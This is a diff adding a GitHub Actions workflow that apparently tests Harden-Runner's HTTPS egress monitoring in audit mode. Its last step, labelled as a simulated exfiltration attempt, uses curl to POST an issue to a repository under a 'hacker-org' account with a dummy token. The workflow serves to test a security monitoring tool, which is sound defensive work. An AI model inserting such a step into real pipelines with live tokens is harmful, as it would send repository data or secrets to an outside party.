@@ -1,0 +1,24 @@
+name: "Hosted: HTTPS Monitoring with Harden-Runner"
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: step-security/harden-runner@v2
+        with:
+          egress-policy: audit
+
+      - uses: actions/checkout@v3
+
+      - uses: JasonEtco/create-an-issue@v2
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Simulate exfiltration attempt
+        run: |
+          curl -X POST -H "Authorization: token 123" \
+          -H "Accept: application/vnd.github.v3+json" \
+          https://api.github.com/repos/hacker-org/test-repo/issues \
+          -d '{"title":"Issue Title","body":"Issue description goes here."}'
